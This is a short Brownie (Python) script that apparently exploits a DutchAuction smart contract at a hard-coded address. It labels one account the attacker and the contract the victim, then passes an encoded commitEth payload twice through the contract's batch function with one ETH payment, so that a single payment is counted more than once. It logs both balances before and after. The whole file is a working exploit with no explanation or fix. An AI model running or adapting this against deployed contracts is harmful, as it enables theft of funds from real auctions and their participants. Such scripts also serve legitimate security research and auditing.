from brownie import *
import time
import math

DutchAuctionAddress = '0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e'


def main():
    attacker = accounts[1]
    dutch = interface.IDutchAuction(DutchAuctionAddress)

    print("Attacker balance before commitEth:", attacker.balance().to('ether'))
    print("Victim balance before commitEth:", dutch.balance().to('ether'))

    payload = dutch.commitEth.encode_input(attacker, True)

    attackerBalance = math.floor(attacker.balance().to('ether'))
    dutch.batch([payload, payload], True, {'from': attacker, 'value': Wei(str(attackerBalance) + " ether")})

    print("Attacker balance after commitEth:", attacker.balance().to('ether'))
    print("Victim balance after commitEth:", dutch.balance().to('ether'))

    
